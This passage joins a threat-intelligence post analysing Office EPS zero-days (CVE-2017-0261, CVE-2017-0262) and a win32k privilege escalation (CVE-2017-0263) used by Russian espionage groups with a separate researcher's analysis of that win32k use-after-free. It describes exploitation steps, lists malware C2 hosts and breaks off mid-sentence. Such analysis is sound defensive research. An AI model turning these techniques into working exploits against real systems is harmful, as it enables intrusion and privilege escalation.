From the [PostScript Manual](https://pingprod.fnal.gov:9031/idp/SSO.saml2?SAMLRequest=hZJdb4IwGIX%2FCuk9AvVj0AiJwkxM3Edk28Vulg5ftQm0Xd%2Bi279fwcy5G3fV5O057XlOO0Xe1JrNWruXa%2FhoAa332dQSWb%2BRktZIpjgKZJI3gMxWrJzdrRgdhEwbZVWlanJhue7giGCsUJJ4yyIlb8Px7TihYUyL4Tgfzuksn9BJvoijeDEfF8kN8V7AoNOnxNmdCbGFpUTLpXWjkEZ%2BmPh09BRRNhqxUfxKvMIxCMlt79pbq5EFgRZy5%2BJuBlvJ68FOHVgSDqNAbHRQlg%2BDLjklXq4kQnfyNYbqJGJVa4xbfdHoWlTCEm%2BhTAV9lSnZ8hqhC%2FzomMUBzpPZTwXdZW0DpgRzEBU8r1e%2FcQ9C%2B0d4t7QKk3PkoIG6VjLQCu0aUHc5SDbtsrO%2BGJNd9U%2BDS%2Bn09PL3jm9ZPCqH8NUBNPwf%2FG4iNv62lzJruEThanBgLtwxN8Ctg7WmBRJkpyv%2F%2Fq%2FsGw%3D%3D&RelayState=https%3A%2F%2Fwww-cdf.fnal.gov%2Foffline%2FPostScript%2FPLRM2.pdf&SigAlg=http%3A%2F%2Fwww.w3.org%2F2001%2F04%2Fxmldsig-more%23rsa-sha256&Signature=ZvwpuFD7qS7Ygf6MLteoDQln5Kh9%2Fgvow8cFdgX7kJhG%2FTPt2Lrp%2FweWpK3nwVBouW%2FgMoaUB%2B2QAlrdSWiJ%2B%2FNT71eexFzOEmIQSo3iJ9s48oxcrMvWW14%2FF5ZNh9EvkQzNCHcviFyGWmkhvtVt65%2FpfecLzB3pZHqoI8lYIxPIdRg80n%2BjsoUUQKqyzmOa6ABbEJOUMQA8T4VYRGp7IboZ0Jojst1uZdnDzCQYt%2B0cOxbHlimR7eaXQ5jkSRW2BN%2F5WN8a22XXY%2FiG3ljLw4LJIrkSkrgwEX4bwQc7ibwT2mYvatfZNkg0rp%2Fz01T3wDVBe7BcIJfZKKDSV6auZQ%3D%3D): “Allocations in local VM and modifications to existing objects in local VM are subject to a feature called **save** and **restore**, named after the operators that invoke it. **save** and **restore** bracket a section of a PostScript language program whose local VM activity is to be encapsulated. **restore** deallocates new objects and undoes modifications to existing objects that were made since the matching **save**.”

As the manual described, the *restore* operator will reclaim memory allocated since the *save* operator. This makes a perfect condition of Use-After-Free, when combined with *forall* operator. Figure 1 shows the pseudo code to exploit the save and restore operation.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps1_yxpf.max-1100x1100.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps1_yxpf.max-1100x1100.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps1_yxpf.max-1100x1100.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps1_yxpf.max-1100x1100.png)

Figure 1: Pseudo code for the exploit

The following operations allow the Pseudo code to leak metadata enabling a read/write primitive:

1. forall\_proc array is created with a single element of the restore proc
2. The EPS state is ***saved*** to eps\_state
3. uaf\_array is created after the save
4. The forall operator loops over the elements of the uaf\_array calling forall\_proc for each element
5. The first element of uaf\_array is passed to a call of restore\_proc, the procedure contained in forall\_proc
6. restore\_proc
   * ***restores*** the initial state freeing the uaf\_array
   * The alloc\_string procedure reclaims the freed uaf\_array
   * The forall\_proc is updated to call leak\_proc
7. Subsequent calls by the forall operator call the leak\_proc on each element of the reclaimed uaf\_array which elements now contain the result of the alloc\_string procedure

Figure 2 demonstrates a debug log of the uaf\_array being used after being reclaimed.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps2_roin.max-1100x1100.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps2_roin.max-1100x1100.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps2_roin.max-1100x1100.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps2_roin.max-1100x1100.png)

Figure 2: uaf\_array reclaimed debug log

By manipulating the operations after the *save* operator, the attacker is able to manipulate the memory layouts and convert the Use-After-Free to create a read/write primitive. Figure 3 shows the faked string, with length set as 0x7fffffff, base as 0.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps3_lcnn.max-1200x1200.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps3_lcnn.max-1200x1200.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps3_lcnn.max-1200x1200.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps3_lcnn.max-1200x1200.png)

Figure 3: Faked String Object

Leveraging the power of reading and writing arbitrary user memory, the EPS program continues by searching for gadgets to build the ROP chain, and creates a ***file*** object. Figure 4 demonstrates the faked file object in memory.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps4_cexr.max-1300x1300.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps4_cexr.max-1300x1300.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps4_cexr.max-1300x1300.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps4_cexr.max-1300x1300.png)

Figure 4: Fake File Object, with ROP

By calling ***closefile*** operand with the faked file object, the exploit pivots to the ROP and starts the shellcode. Figure 5 shows part of the disassembler of ***closefile*** operand handler.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/ep5_khit.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/ep5_khit.max-800x800.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/ep5_khit.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/ep5_khit.max-800x800.png)

Figure 5: Stack Pivot disassembler of closefile

Once execution has been achieved, the malware uses the ROP chain to change the execution protection of the memory region containing the shellcode. At this point, the shellcode is running within a sandbox that was executing FLTLDR.EXE and an escalation of privilege is required to escape that sandbox.

FireEye detected two different versions of the EPS program exploiting this vulnerability. The first, st07383.en17.docx, continues by utilizing 32 or 64 bit versions of CVE-2017-0001 to escalate privileges before executing a final JavaScript payload containing a malware implant known as SHIRIME. SHIRIME is one of multiple custom JavaScript implants used by Turla as a first stage payload to conduct initial profiling of a target system and implement command and control. Since early 2016, we have observed multiple iterations of SHIRIME used in the wild, having the most recent version (v1.0.1004) employed in this zero-day

The second document, Confirmation\_letter.docx, continues by utilizing 32 or 64 bit versions of CVE-2016-7255 to escalate privilege before dropping a new variant of the NETWIRE malware family. Several versions of this document were seen with similar filenames.

The EPS programs contained within these documents contained different logic to perform the construction of the ROP chain as well as build the shellcode. The first took the additional step of using a simple algorithm, shown in Figure 6, to obfuscate sections of the shellcode.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps6-image.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps6-image.max-800x800.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps6-image.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps6-image.max-800x800.png)

Figure 6: Shellcode obfuscation algorithm

#### CVE-2017-0262 – Type Confusion in EPS

The second EPS vulnerability is a type confused procedure object of forall operator that can alter the execution flow allowing an attacker to control values onto the operand stack. This vulnerability was found in a document named “Trump's\_Attack\_on\_Syria\_English.docx”.

Before triggering the vulnerability, the EPS program sprays the memory with predefined data to occupy specific memory address and facilitate the exploitation. Figure 7 demonstrates the PostScript code snippet of spraying memory with a string.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps7-image.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps7-image.max-800x800.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps7-image.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps7-image.max-800x800.png)

Figure 7: PostScript code snippet of spray

After execution, the content of string occupies the memory at address 0x0d80d000, leading to the memory layout as shown in Figure 8. The exploit leverages this layout and the content to forge a procedure object and manipulate the code flow to store predefined value, in yellow, to the operator stack.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps8-image.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps8-image.max-800x800.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps8-image.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps8-image.max-800x800.png)

Figure 8: Memory layout of the sprayed data

After spraying the heap, the exploit goes on to call a code statement in the following format: *1 array 16#D80D020 forall*. It creates an Array object, sets the procedure as the hex number 0xD80D020, and calls the *forall* operator. During the operation of the forged procedure within *forall* operator, it precisely controls the execution flow to store values of the attacker's choices to operand stack. Figure 9 shows the major code flow consuming the forged procedure.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps9_dfhe.max-1400x1400.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps9_dfhe.max-1400x1400.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps9_dfhe.max-1400x1400.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps9_dfhe.max-1400x1400.png)

Figure 9: Consuming the forged procedure

After execution of *forall*, the contents on the stack are under the attacker's control. This is s shown in Figure 10.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps10-image.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps10-image.max-800x800.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps10-image.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps10-image.max-800x800.png)

Figure 10: Stack after the forall execution

Since the operand stack has been manipulated, the subsequent operations of *exch* defines objects based on the data from the manipulated stack, as shown in Figure 11.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps11-image.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps11-image.max-800x800.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps11-image.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps11-image.max-800x800.png)

Figure 11: Subsequent code to retrieve data from stack

The A18 is a string type object, which has a length field of 0x7ffffff0, based from 0. Within memory, the layout as shown in Figure 12.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps12-image.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps12-image.max-800x800.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps12-image.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps12-image.max-800x800.png)

Figure 12: A18 String Object

The A19 is an array type object, with member values all purposely crafted. The exploit defines another array object and puts it into the forged array A19. By performing these operations, it puts the newly created array object pointer into A19. The exploit can then directly read the value from the predictable address, 0xD80D020 + 0x38, and leak its vftable and infer module base address of EPSIMP32.flt. Figure 13 shows code snippets of leaking EPSIMP32 base address.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps13-image.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps13-image.max-800x800.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps13-image.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps13-image.max-800x800.png)

Figure 13: Code snippet of leaking module base

Figure 14 shows the operand stack of calling *put* operator and the forged Array A19 after finishing the *put* operation.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps14_jhjf.max-900x900.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps14_jhjf.max-900x900.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps14_jhjf.max-900x900.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps14_jhjf.max-900x900.png)

Figure 14: Array A19 after the put operation

By leveraging the RW primitive string and the leaked module base of EPSIMP32, the exploit continues by searching ROP gadgets, creating a fake file object, and pivoting to shellcode through the *bytesavailable* operator. Figure 15 shows the forged file type object and disassembling of pivoting to ROP and shellcode.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps15_yzte.max-900x900.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps15_yzte.max-900x900.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps15_yzte.max-900x900.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps15_yzte.max-900x900.png)

Figure 15: Pivots to ROP and Shellcode

The shellcode continues by using a previously unknown EOP, CVE-2017-0263, to escalate privileges to escape the sandbox running FLTLDR.EXE, and then drop and execute a GAMEFISH payload. Only a 32-bit version of CVE-2017-0263 is contained in the shellcode.

#### CVE-2017-0263 – win32k!xxxDestroyWindow Use-After-Free

The EOP Exploit setup starts by suspending all threads other than the current thread and saving the thread handles to a table, as shown in Figure 16.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps16_ynav.max-700x700.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps16_ynav.max-700x700.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps16_ynav.max-700x700.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps16_ynav.max-700x700.png)

Figure 16: Suspending Threads

The exploit then checks for OS version and uses that information to populate version specific fields such as token offset, syscall number, etc. An executable memory area is allocated and populated with kernel mode shellcode as wells as address information required by the shellcode. A new thread is created for triggering the vulnerability and further control of exploitation.

The exploit starts by creating three PopupMenus and appending menus to them, as shown in Figure 17. The exploit creates 0x100 windows with random classnames. The User32!HMValidateHandle trick is used to leak the tagWnd address, which is used as kernel information leak throughout the exploit.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps17-image.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps17-image.max-800x800.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps17-image.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps17-image.max-800x800.png)

Figure 17: Popup menu creation

RegisterClassExW is then used to register a window class “Main\_Window\_Class” with a WndProc pointing to a function, which calls DestroyWindow on window table created by EventHookProc, explained later in the blog. This function also shows the first popup menu, which was created earlier.

Two extra windows are created with class name as “Main\_Window\_Class”. SetWindowLong is used to change WndProc of second window, wnd2, to a shellcode address. An application defined hook, WindowHookProc, and an event hook, EventHookProc, are installed by SetWindowsHookExW and SetWinEventHook respectively. PostMessage is used to post 0xABCD to first window, wnd1.

The EventHookProc waits for EVENT\_SYSTEM\_MENUPOPUPSTART and saves the window’s handle to a table. WindowHookProc looks for **SysShadow** classname and sets a new WndProc for the corresponding window. Inside this WndProc, NtUserMNDragLeave syscall is invoked and SendMessage is used to send 0x9f9f to wnd2, invoking the shellcode shown in Figure 18.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps18-image.max-700x700.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps18-image.max-700x700.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps18-image.max-700x700.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps18-image.max-700x700.png)

Figure 18: Triggering the shellcode

The Use-After-Free happens inside WM\_NCDESTROY event in kernel and overwrites wnd2’s tagWnd structure, which sets bServerSideWindowProc flag. With bServerSideWindowProc set, the user mode WndProc is considered as a kernel callback and will be invoked from kernel context – in this case wnd2’s WndProc is the shellcode.

The shellcode checks whether the memory corruption has occurred by checking if the code segment is not the user mode code segment. It also checks whether the message sent is 0x9f9f. Once the validation is completed, shellcode finds the TOKEN address of current process and TOKEN of system process (pid 4). The shellcode then copies the system process’ token to current process, which elevates current process privilege to SYSTEM.

#### Conclusion

*EPS processing has become a ripe exploitation space for attackers.*

FireEye has discovered and analyzed two of these recent EPS zero-days with examples seen before and after Microsoft disabled EPS processing in the April 2017 Patch Tuesday. The documents explored utilize differing EPS exploits, ROP construction, shellcode, EOP exploits and final payloads. While these documents are detected by FireEye appliances, users should exercise caution because FLTLDR.EXE is not monitored by EMET.

*Russian cyber espionage is a well-resourced, dynamic threat*

The use of zero-day exploits by Turla Group and APT28 underscores their capacity to apply technically sophisticated and costly methods when necessary. Russian cyber espionage actors use zero-day exploits in addition to less complex measures. Though these actors have relied on credential phishing and macros to carry out operations previously, the use of these methods does not reflect a lack of resources. Rather, the use of less technically sophisticated methods – when sufficient – reflects operational maturity and the foresight to protect costly exploits until they are necessary.

*A vibrant ecosystem of threats*

CVE-2017-0261’s use by multiple actors is further evidence that cyber espionage and criminal activity exist in a shared ecosystem. Nation state actors, such as those leveraging [CVE-2017-0199 to distribute FINSPY](https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199_useda.html), often rely on the same sources for exploits as criminal actors. This shared ecosystem creates a proliferation problem for defenders concerned with either type of threat.

CVE-2017-0261 was being used as a zero-day by both nation state and cyber crime actors, and we believe that both actors obtained the vulnerability from a common source. Following [CVE-2017-0199](https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html), this is the second major vulnerability in as many months that has been used for both espionage and crime.

| **MD5** | **Filename** | **C2 Host** |
| --- | --- | --- |
| 2abe3cc4bff46455a945d56c27e9fb45 | Confirmation\_letter.docx.bin  (NETWIRE) | 84.200.2.12 |
| e091425d23b8db6082b40d25e938f871 | Confirmation\_letter.docx  (NETWIRE) | 138.201.44.30 |
| 006bdb19b6936329bffd4054e270dc6a | Confirmation\_letter\_ACM.docx  (NETWIRE) | 185.106.122.113 |
| 15660631e31c1172ba5a299a90938c02 | st07383.en17.docx  (SHIRIME) | tnsc.webredirect.org |
| f8e92d8b5488ea76c40601c8f1a08790 | Trump's\_Attack\_on\_Syria\_English.docx  (GAMEFISH) | wmdmediacodecs.com |

Table 1: Source Exploit Documents

![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps-tab2_npdm.max-500x500.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps-tab2_npdm.max-500x500.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/eps-tab2_npdm.max-500x500.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/eps-tab2_npdm.max-500x500.png)

Table 2: CVEs related to these attacks

#### Acknowledgements

iSIGHT Intelligence Team, FLARE Team, FireEye Labs, Microsoft Security Response Center (MSRC).

Posted in

* [Threat Intelligence](https://cloud.google.com/blog/topics/threat-intelligence)
* [Security & Identity](https://cloud.google.com/blog/products/identity-security)
##### Related articles

[![https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png)Threat Intelligence
### Securing Cryptocurrency Organizations

By Mandiant • 27-minute read](https://cloud.google.com/blog/topics/threat-intelligence/securing-cryptocurrency-organizations)[![https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png)Threat Intelligence
### Your Single-Page Applications Are Vulnerable: Here's How to Fix Them

By Mandiant • 9-minute read](https://cloud.google.com/blog/topics/threat-intelligence/single-page-applications-vulnerable)[![https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png)Threat Intelligence
### Backscatter: Automated Configuration Extraction

By Mandiant • 4-minute read](https://cloud.google.com/blog/topics/threat-intelligence/backscatter-automated-configuration-extraction)[![https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png)Threat Intelligence
### Ivanti Connect Secure VPN Targeted in New Zero-Day Exploitation

By Mandiant • 27-minute read](https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day)

=== Content from xiaodaozhi.com_383637c5_20250126_091019.html ===
FROM ANALYZING CVE-2017-0263
TO INVESTIGATING MENU
MANAGEMENT COMPONENT

Author: Leeqwind (@leeqwind)

Source: https://xiaodaozhi.com/exploit/117.html

CVE-2017-0263 is a UAF vulnerability in Menu Management Component in
win32k  kernel module of Windows operating system, which was reported

to be used to attack with an EPS vulnerability to interfere the French

election. This article will simply analyze the CVE-2017-0263 part of the

attacking sample in order to come up with the operation principle and basic

exploiting idea of this vulnerability, and make a brief investigation into the

Menu Management Component of Windows Window Manager Subsystem.

The analyzing environment is Windows 7 x86 SP1 basic virtual machine.

In this article, in order to highlight the important points, in the analysis of the

involved system functions, the irrelevant calling statements will be omitted.

Only the calling and assignment statements that affect or possibly affect the
vulnerability triggering logic are paid attention to and analyzed or

interpreted.

0x0 Abstract

This article analyzes the CVE-2017-0263 UAF vulnerability occurring in the

Menu Management Component of Window Manager (User) Subsystem.

After freeing the root popup menu object pointed to by field  pGlobalPopupM

enu  of global menu state object in function  win32k!xxxMNEndMenuState ,

there is no statement assigning the field to zero but should have been,

which causes the field to still point to the freed memory as a wild pointer. In

subsequent code logic, it is still possible that the freed memory will be read

or written or double-freed.

After freeing the object pointed to by field  pGlobalPopupMenu , function  xxx
MNEndMenuState  also resets the field  pMenuState  of the thread information

object associated with the current thread, which results in most of the

interfaces tracing and operating popup menu not able to achieve the
triggering condition. However, before reseting field  pMenuState , there is a

statement unlocking and freeing field  uButtonDownHitArea  of global menu

state object. This field stores the pointer to the window object on which the

current pressed mouse button is located (if the mouse button has been

being pressed).

If the user process has previously constructed menu window objects with

special associations and properties through exploiting techniques, during

the time between freeing field  pGlobalPopupMenu  and resetting field  pMenu
State  in function  xxxMNEndMenuState , the execution flow would be called

back into the user process. The exploitation code in the user process would

have enough ability to change the state of the current popup menu, which

causes the execution flow to reenter  xxxMNEndMenuState  function, and to

double-free the memory of original root popup menu, which causes BSOD

of the operating system.

At the first time the kernel freeing the memory pointed to by field  pGlobalPo
pupMenu  and the execution flow being called back into user-mode context,

through accurate memory layout, exploiting code lets system reallocate a

memory block of the same size to occupy the memory area previously freed

pointed to by field  pGlobalPopupMenu , in order to fake the new root popup
menu object. With the help of code logic, realizing the modification of field

bServerSideWindowProc  of specific window object, exploitation code lets

system be able to execute the custom window message procedure located

in the user process address space directly in the kernel, which makes the

exploitation code constructed by the user process can be executed in the

kernel context to realize elevation of privilege.

0x1 Principle

CVE-2017-0263 exists in the Menu Management Component of the  win32k

 Window Manager (User) Subsystem. After freeing the object memory

pointed to by field  pGlobalPopupMenu  of target  tagMENUSTATE  structure

object, function  xxxMNEndMenuState  doesn't set the field as zero.

There is a global menu state object defined as  tagMENUSTATE  structure in

win32k  module named  gMenuState . In the current operating system

environment, the structure is defined as below:

kd> dt win32k!tagMENUSTATE
   +0x000 pGlobalPopupMenu : Ptr32 tagPOPUPMENU
   +0x004 flags            : Int4B
   +0x008 ptMouseLast      : tagPOINT
   +0x010 mnFocus          : Int4B
   +0x014 cmdLast          : Int4B
   +0x018 ptiMenuStateOwner : Ptr32 tagTHREADINFO
   +0x01c dwLockCount      : Uint4B
   +0x020 pmnsPrev         : Ptr32 tagMENUSTATE
   +0x024 ptButtonDown     : tagPOINT
   +0x02c uButtonDownHitArea : Uint4B
   +0x030 uButtonDownIndex : Uint4B
   +0x034 vkButtonDown     : Int4B
   +0x038 uDraggingHitArea : Uint4B
   +0x03c uDraggingIndex   : Uint4B
   +0x040 uDraggingFlags   : Uint4B
   +0x044 hdcWndAni        : Ptr32 HDC__
   +0x048 dwAniStartTime   : Uint4B
   +0x04c ixAni            : Int4B
   +0x050 iyAni            : Int4B
   +0x054 cxAni            : Int4B
   +0x058 cyAni            : Int4B
   +0x05c hbmAni           : Ptr32 HBITMAP__
   +0x060 hdcAni           : Ptr32 HDC__

The definition of tagMENUSTATE structure

Menu management is one of the most complex components of  win32k ,
while menu handling as a whole depends on multiple fairly complex

functions and structures. For instance, in creating popup menus,

applications call  TrackPopupMenuEx  to create a menu classed window in

which the menu content is displayed. The menu window then processes

message input through a system-defined menu window class procedure  xx

xMenuWindowProc , in order to handle various menu specific messages.  win

32k  also associates a menu state structure  tagMENUSTATE  with the

currently active menu. In this way, functions can be aware of whether a

menu is involved in a drag and drop operation, inside a menu loop, about to

be terminated, etc.

Menu state structure is used to store the detailed information related to the

state of the currently active menu, including the coordinates of the context

popup menu, the pointer to the related bitmap surface object, the window

device context object, the pointer to previous context menu structure, and

some other member fields.

There is also a pointer field  pMenuState  to the menu state structure in
thread information structure  tagTHREADINFO :

kd> dt win32k!tagTHREADINFO -d pMenuState
   +0x104 pMenuState : Ptr32 tagMENUSTATE

Structure tagTHREADINFO has pMenuState field

When user popups context menu in some way such as clicking the mouse

right button, finally the system executes into  xxxTrackPopupMenuEx

function in the kernel. This function calls  xxxMNAllocMenuState  function to

allocate or initialize the menu state structure.

In function  xxxMNAllocMenuState , system zeros all the fields of the global
menu state object  gMenuState  and initializes part of the fields, then stores
the address of global menu state object into field  pMenuState  of the
current thread information object.

  menuState = (tagMENUSTATE *)&gMenuState;
  [...]
  memset(menuState, 0, 0x60u);
  menuState->pGlobalPopupMenu = popupMenuRoot;
  menuState->ptiMenuStateOwner = ptiCurrent;
  menuState->pmnsPrev = ptiCurrent->pMenuState;
  ptiCurrent->pMenuState = menuState;
  if ( ptiNotify != ptiCurrent )
    ptiNotify->pMenuState = menuState;

  [...]
  return menuState;

Snippet of function xxxMNAllocMenuState

The function initializes fileds  pGlobalPopupMenu  /  ptiMenuStateOwner

and  pmnsPrev  of menu state structure. Field  pGlobalPopupMenu  points to

the popup menu structure  tagPOPUPMENU  object from parameters as the

root popup menu. Popup menu structure stores the pointers to various

kernel object related to the popup menu, and is associated with the

corresponding menu window object. The structure is defined as below:

kd> dt win32k!tagPOPUPMENU
   +0x000 flags            : Int4B
   +0x004 spwndNotify      : Ptr32 tagWND
   +0x008 spwndPopupMenu   : Ptr32 tagWND
   +0x00c spwndNextPopup   : Ptr32 tagWND
   +0x010 spwndPrevPopup   : Ptr32 tagWND
   +0x014 spmenu           : Ptr32 tagMENU
   +0x018 spmenuAlternate  : Ptr32 tagMENU
   +0x01c spwndActivePopup : Ptr32 tagWND
   +0x020 ppopupmenuRoot   : Ptr32 tagPOPUPMENU
   +0x024 ppmDelayedFree   : Ptr32 tagPOPUPMENU
   +0x028 posSelectedItem  : Uint4B
   +0x02c posDropped       : Uint4B

The definition of structure tagPOPUPMENU

Field  ptiMenuStateOwner  of menu state structure points to the thread
information object of current thread. The menu state object pointer

previously stored in the thread information object is stored into field  pmnsPr

ev  of the current menu state structure.

Then the function stores the address of the current menu state structure

into filed  pMenuState  of the current thread (as well as the notification

thread) information structure  tagTHREADINFO  object from parameters, and
returns the address of the menu state structure as the returned value to the

superior caller function.

The relation between ptiCurrent and gMenuState

When user select menu item via mouse or keyboard, or click on the screen

area outside the menu, system sends messages descripting 'mouse button

down' or 'menu end' to the window object of current context menu. If the

menu type is modal, this would cause the thread from the previous
invocation of the  xxxMNLoop  function to loop out of the menu loop waiting

state, making the function continue backward.

System calls  xxxMNEndMenuState  function to clean up the informations

stored in menu state structure and free relevant popup menu object and

window object.

  ptiCurrent = gptiCurrent;
  menuState = gptiCurrent->pMenuState;
  if ( !menuState->dwLockCount )
  {
    MNEndMenuStateNotify(gptiCurrent->pMenuState);
    if ( menuState->pGlobalPopupMenu )
    {
      if ( fFreePopup )
        MNFreePopup(menuState->pGlobalPopupMenu);
      else
        *(_DWORD *)menuState->pGlobalPopupMenu &= 0xFFFEFFFF;
    }
    UnlockMFMWFPWindow(&menuState->uButtonDownHitArea);
    UnlockMFMWFPWindow(&menuState->uDraggingHitArea);

    ptiCurrent->pMenuState = menuState->pmnsPrev;
    [...]
  }

Snippet of function xxxMNEndMenuState

In function  xxxMNEndMenuState , system retrieves menu state structure

from field  pMenuState  of the current thread information object. Then the
function judges whether field  pGlobalPopupMenu  of the menu state object

is null. If not, the function calls  MNFreePopup  to destroy the popup menu  t

agPOPUPMENU  object pointed to by this field. After the corresponding

preprocessing is performed, function  MNFreePopup  calls  ExFreePoolWithT

ag  to release the  tagPOPUPMENU  object buffer from parameters.

  if ( popupMenu == popupMenu->ppopupmenuRoot )
    MNFlushDestroyedPopups(popupMenu, 1);
  pwnd = popupMenu->spwndPopupMenu;
  if ( pwnd && (pwnd->fnid & 0x3FFF) == 0x29C && popupMenu != &gpopupMenu )
    *((_DWORD *)pwnd + 0x2C) = 0;
  HMAssignmentUnlock(&popupMenu->spwndPopupMenu);
  HMAssignmentUnlock(&popupMenu->spwndNextPopup);
  HMAssignmentUnlock(&popupMenu->spwndPrevPopup);
  UnlockPopupMenu(popupMenu, &popupMenu->spmenu);
  UnlockPopupMenu(popupMenu, &popupMenu->spmenuAlternate);
  HMAssignmentUnlock(&popupMenu->spwndNotify);
  HMAssignmentUnlock(&popupMenu->spwndActivePopup);
  if ( popupMenu == &gpopupMenu )
    gdwPUDFlags &= 0xFF7FFFFF;
  else
    ExFreePoolWithTag(popupMenu, 0);

Snippet of function MNFreePopup

Then the problem arises: after freeing the popup menu object pointed to by

field  pGlobalPopupMenu  of menu state structure, function  xxxMNEndMenuSt
ate  doesn't zero this field, which causes the memory address pointed to by

the field in an uncontrollable state, and leads to some potential problems

such as use-after-free.

0x2 Tracing

There is an exported function  TrackPopupMenuEx  in  user32.dll  module

used to display menu at the specified location on the screen and to track

selected menu item. When user calls this function, the system finally

execute  xxxTrackPopupMenuEx  function to handle menu popping up

operation.

Menu-Related Objects

In this analysis, you will find such menu-related objects: menu object, menu

window object, and popup menu object.

Among them, menu object is the entity of menu, which exists in the form of
tagMENU  structure instance in the kernel, and is used to describe the static

information such as menu items, item count, size, etc. But it is not

responsible for the display of menu on the screen. When user calls

interface functions such as  CreateMenu  the system creates menu object in

the kernel. When function  DestroyMenu  is called or the user process is
being killed, menu object is to be destroyed.

When a menu is needed to be displayed on the screen, for example, user

right-clicks mouse in a window area, the system would invoke some
relevant service functions to create corresponding  MENUCLASS  classed
window object according to the target menu object. Menu window object is

a special type of window structure  tagWND  object, normally in form of  tagM

ENUWND  structure, responsible for describing the dynamic state such as the

position to display, style, etc. Its extra area is associated with the

